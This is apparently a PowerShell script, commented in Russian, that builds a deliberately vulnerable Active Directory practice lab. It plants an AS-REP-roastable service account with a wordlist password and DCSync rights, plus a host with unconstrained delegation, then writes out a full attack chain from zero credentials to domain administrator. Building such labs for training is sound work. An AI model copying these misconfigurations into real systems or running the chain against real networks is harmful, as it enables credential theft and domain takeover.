#Requires -RunAsAdministrator
param(
    [string]$DomainName = "pentest.local",
    [string]$DomainNetBIOS = "PENTEST",
    [string]$SafeModePassword = "P@ssw0rd!SafeMode2024",
    [string]$AdminPassword = "Str0ng!Adm1n#2024$ecure"
)

$ErrorActionPreference = "Stop"
Write-Host "🔧 AD Lab Medium v2 (реалистичная цепочка)..." -ForegroundColor Cyan

# === ЭТАП 1: AD DS (как раньше) ===
if (-not (Get-WindowsFeature AD-Domain-Services).Installed) {
    Install-WindowsFeature AD-Domain-Services -IncludeManagementTools | Out-Null
    if (-not (Get-ADDomain -ErrorAction SilentlyContinue)) {
        Install-ADDSForest -DomainName $DomainName -DomainNetbiosName $DomainNetBIOS `
            -SafeModeAdministratorPassword (ConvertTo-SecureString $SafeModePassword -AsPlainText -Force) `
            -InstallDns:$true -NoRebootOnCompletion:$false -Force | Out-Null
        Write-Host "⚠️ Перезагрузка. Запустите скрипт снова." -ForegroundColor Red; exit 0
    }
}
$retries=0; while(-not(Get-ADDomain -EA 0) -and $retries -lt 30){Start-Sleep 5;$retries++}

# === ЭТАП 2: Защита (как раньше) ===
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" -Name "RequireSecuritySignature" -Value 1
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 4
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictAnonymous" -Value 1
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 0
Set-ADDefaultDomainPasswordPolicy -Identity $DomainName -MinPasswordLength 12 -ComplexityEnabled $true

# === ЭТАП 3: Структура ===
$dn = (Get-ADDomain).DistinguishedName
@("Servers","Workstations","ServiceAccounts","IT-Staff") | % {
    if(-not(Get-ADOrganizationalUnit -Filter "Name -eq '$_'" -EA 0)){New-ADOrganizationalUnit -Name $_ -ProtectedFromAccidentalDeletion $false | Out-Null}
}

# Обычные юзеры (сильные пароли, НЕ в wordlist — не взломать)
@(@{N="alice.johnson";P="X9#mK2\$pL7!nQ4wZ"},@{N="carol.white";P="W2*qF9#dM5!kS7xY"}) | % {
    if(-not(Get-ADUser -Filter "SamAccountName -eq '$($_.N)'" -EA 0)){
        New-ADUser -Name $_.N -SamAccountName $_.N -AccountPassword (ConvertTo-SecureString $_.P -AsPlainText -Force) `
            -Enabled $true -Path "OU=Workstations,$dn" | Out-Null
    }
}

# === ЭТАП 4: 🎯 ГЛАВНАЯ УЯЗВИМОСТЬ — AS-REP + DCSync в одном лице ===
Write-Host "🎯 Настройка цепочки атаки..." -ForegroundColor Red

# Сервисный аккаунт:
# 1. Без pre-auth (AS-REP roasting работает без creds)
# 2. Пароль В wordlist (подберётся через john/hashcat)
# 3. В группе с DCSync правами (после взлома → secretsdump)
$targetUser = "svc_backupagent"
$targetPass = "Welcome2024!"  # ← Есть в rockyou.txt, но это НЕ "слабый пароль" в классическом смысле
                               # Это реалистично: админ поставил "временный" пароль и забыл сменить

if (-not (Get-ADUser -Filter "SamAccountName -eq '$targetUser'" -EA 0)) {
    New-ADUser -Name $targetUser -SamAccountName $targetUser `
        -AccountPassword (ConvertTo-SecureString $targetPass -AsPlainText -Force) `
        -Enabled $true -Description "Backup Agent Service" `
        -Path "OU=ServiceAccounts,$dn" | Out-Null
    
    # AS-REP уязвимость
    Set-ADAccountControl $targetUser -DoesNotRequirePreAuth $true
    
    # Создаём группу с DCSync правами
    $dcSyncGroup = "AD-Backup-Operators"
    if (-not (Get-ADGroup -Filter "Name -eq '$dcSyncGroup'" -EA 0)) {
        New-ADGroup -Name $dcSyncGroup -GroupScope Global -Path "OU=IT-Staff,$dn" | Out-Null
        
        # Даём DCSync права (DS-Replication-Get-Changes + All)
        $acl = Get-Acl "AD:$dn"
        $gSid = (Get-ADGroup $dcSyncGroup).SID
        $guid1 = [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
        $guid2 = [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
        $acl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule($gSid,"ExtendedRight","Allow",$guid1)))
        $acl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule($gSid,"ExtendedRight","Allow",$guid2)))
        Set-Acl -AclObject $acl "AD:$dn"
    }
    
    # Добавляем целевого юзера в группу с DCSync
    Add-ADGroupMember -Identity $dcSyncGroup -Members $targetUser
    
    Write-Host "   🎯 $targetUser :" -ForegroundColor Red
    Write-Host "      • DoesNotRequirePreAuth = TRUE (AS-REP)" -ForegroundColor DarkYellow
    Write-Host "      • Член группы '$dcSyncGroup' (DCSync права)" -ForegroundColor DarkYellow
    Write-Host "      • Пароль: временный, забыли сменить" -ForegroundColor DarkYellow
}

# === ЭТАП 5: Unconstrained Delegation (бонус вектор) ===
$fileServer = "FILE-SRV01"
if (-not (Get-ADComputer -Filter "Name -eq '$fileServer'" -EA 0)) {
    New-ADComputer -Name $fileServer -Path "OU=Servers,$dn" -TrustedForDelegation $true | Out-Null
    Write-Host "   🎯 $fileServer : Unconstrained Delegation" -ForegroundColor Red
}

# === ЭТАП 6: RDP/WinRM ===
Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -EA 0 | Out-Null
winrm quickconfig -force -quiet 2>$null | Out-Null
Enable-PSRemoting -Force -SkipNetworkProfileCheck | Out-Null

$dcIP = (Get-NetIPAddress -AddressFamily IPv4 | ? {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -ne "127.0.0.1"} | select -First 1).IPAddress

Write-Host "`n============================================" -ForegroundColor Cyan
Write-Host "✅ LAB MEDIUM v2 ГОТОВА!" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "DC IP: $dcIP | Домен: $DomainName" -ForegroundColor White
Write-Host ""
Write-Host "🎯 РЕАЛИСТИЧНАЯ ЦЕПОЧКА (без знания паролей):" -ForegroundColor Yellow
Write-Host ""
Write-Host "1. netexec ldap $dcIP -u '' -p '' --asreproast asrep.txt" -ForegroundColor Gray
Write-Host "   → Находим svc_backupagent (pre-auth disabled)" -ForegroundColor Gray
Write-Host ""
Write-Host "2. john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt" -ForegroundColor Gray
Write-Host "   → Взламываем хеш → получаем пароль" -ForegroundColor Gray
Write-Host ""
Write-Host "3. netexec smb $dcIP -u svc_backupagent -p '<cracked>' --groups" -ForegroundColor Gray
Write-Host "   → Видим членство в AD-Backup-Operators" -ForegroundColor Gray
Write-Host ""
Write-Host "4. impacket-secretsdump svc_backupagent:'<cracked>'@$dcIP" -ForegroundColor Gray
Write-Host "   → DCSync → получаем ВСЕ хеши включая Administrator" -ForegroundColor Gray
Write-Host ""
Write-Host "5. evil-winrm -i $dcIP -u Administrator -H <admin_hash>" -ForegroundColor Gray
Write-Host "   🎉 DOMAIN ADMIN!" -ForegroundColor Green
Write-Host "============================================`n" -ForegroundColor Cyan

@"
=== AD PENTEST LAB MEDIUM v2 ===
DC: $dcIP | Domain: $DomainName

[REALISTIC ATTACK CHAIN - NO PRIOR CREDS]

Step 1: AS-REP Roasting (anonymous)
  netexec ldap $dcIP -u '' -p '' --asreproast asrep.txt

Step 2: Crack hash
  john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
  # Expected: svc_backupagent:Welcome2024!

Step 3: Verify DCSync rights
  netexec smb $dcIP -u svc_backupagent -p 'Welcome2024!' --groups

Step 4: DCSync → all hashes
  impacket-secretsdump svc_backupagent:'Welcome2024!'@$dcIP

Step 5: Connect as DA
  evil-winrm -i $dcIP -u Administrator -H <NTLM_HASH_FROM_STEP4>

[BONUS VECTOR]
  netexec smb $dcIP -u svc_backupagent -p 'Welcome2024!' --trusted-for-delegation
  # FILE-SRV01 has Unconstrained Delegation

[WHY THIS IS REALISTIC]
• No weak passwords on regular users
• Attack starts with ZERO credentials
• Chain: config error (AS-REP) → crack → privilege abuse (DCSync) → DA
• Mimics real-world: forgotten service account + overprivileged group
"@ | Out-File "$env:USERPROFILE\Desktop\AD_LAB_MEDIUM_v2.txt"

Write-Host "📄 Шпаргалка: Desktop\AD_LAB_MEDIUM_v2.txt" -ForegroundColor Green
